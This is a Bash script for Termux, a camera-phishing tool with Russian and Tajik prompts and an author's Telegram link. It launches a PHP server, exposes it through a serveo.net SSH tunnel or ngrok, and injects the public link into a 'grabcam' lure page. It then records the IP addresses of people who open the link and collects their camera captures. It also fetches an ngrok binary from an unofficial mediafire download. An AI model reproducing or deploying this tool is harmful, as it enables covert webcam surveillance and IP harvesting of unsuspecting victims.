#!/bin/bash

clear
termux-setup-storage
pkg install php -y
pkg install wget -y
clear
trap 'printf "\n";stop' 2

banner() {

echo '

                             __
                         __ /_/\___
                        /__/[]\/__/|o-_
                        |    _     ||   -_  
                        |  ((_))   ||     -_
                        |__________|/

 O))       O))       O)        O)))     O))   O)) O)   O))     O))  O)))))))
 O) O))   O)))      O) ))      O) O))   O)) O))    O)) O))     O))  O))    O))
 O)) O)) O O))     O)  O))     O)) O))  O))  O))       O))     O))  O))    O))
 O))  O))  O))    O))   O))    O))  O)) O))    O))     O))     O))  O) O))
 O))   O)  O))   O)))))) O))   O))   O) O))       O))  O))     O))  O))  O))
 O))       O))  O))       O))  O))    O) )) O))    O)) O))     O))  O))    O))
 O))       O)) O))         O)) O))      O))   O)) O)     O)))))     O))      O))   ' |lolcat

                                                                               
echo " "
printf "      \e[1;77m мой телграм канал https://t.me/mansur_xxl \e[0m \n"
printf "          \e[1;77m Автор { Mansur Odinaev }\e[0m \n"

printf "\n"

echo "      N073:> РАДНОЙ ТОЧКА ДОСТУПТА ГИРОН КЬН КИ ССЫЛКАРА НАМЕТОНИ ГИРИФТА
                   ПОЖАЛУЙСТА, ВКЛЮЧИТЕ СВОЮ ТОЧКУ ДОСТУПА
                    ИНАЧЕ ВЫ НЕ ПОЛУЧИТЕ ССЫЛКУ.......!"

}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 " Ба ман php лозим аст, аммо он насб нашудааст. Онро насб кунед. Қатъкунӣ :Мне нужен php, но он не установлен. Установите его. Прерывание"; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m барои бромадан Ctrl + C зер кнен :Нажмите Ctrl + C для выхода...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] \n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Получен файл Cam!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 " Барои гирифтани файли Cam ssh лозим аст, аммо он насб карда нашудааст. Онро насб кунед. Бекор карда шуд :Для получения файла Cam требуется ssh, но он не установлен. Установите его. Отменено"; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m]Оғози сервер:Запуск сервера...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Оғози сервери php:Запуск php-сервера ... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Пайванди мустақим :Прямая ссылка:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "Ман кушоданро талаб мекунам, аммо он насб нашудааст. Онро насб кунед. Танаффус.:Я требую распаковать, но он не установлен. Установите его. Прерывание."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Ман wget талаб мекунам, аммо он насб нашудааст. Онро насб кунед. Танаффус.:Мне требуется wget, но он не установлен. Установите его. Прерывание.."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Зеркашии Ngrok : Скачать Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1

if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok+wifi+data.zip
else
printf "\e[1;93m[!] Хатои боркунӣ... Thermex, оғоз кунед:Ошибка загрузки... Thermex, начать:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok+wifi+data.zip
else
printf "\e[1;93m[!]Хатои боркунӣ :Ошибка загрузки... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m]Оғози сервери php : Запуск php-сервера...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Оғози сервери ngrok:Запуск сервера ngrok...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Пайванди мустақим:Прямая ссылка:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
#printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
#printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] давом додан мехохед: продолжить: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "Ман ssh талаб мекунам, аммо он насб нашудааст. Онро насб кунед. Танаффус.:Мне требуется ssh, но он не установлен. Установите его. Прерывание."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Параметри ғайриқобили қабул:Недопустимый параметр!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="mansur_xxl$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] зердомена интихоб мекнен ё по умолчания беста : Выбрать поддомен? (По умолчанию::\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]зердомен по умолчания : поддомен по умолчания:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

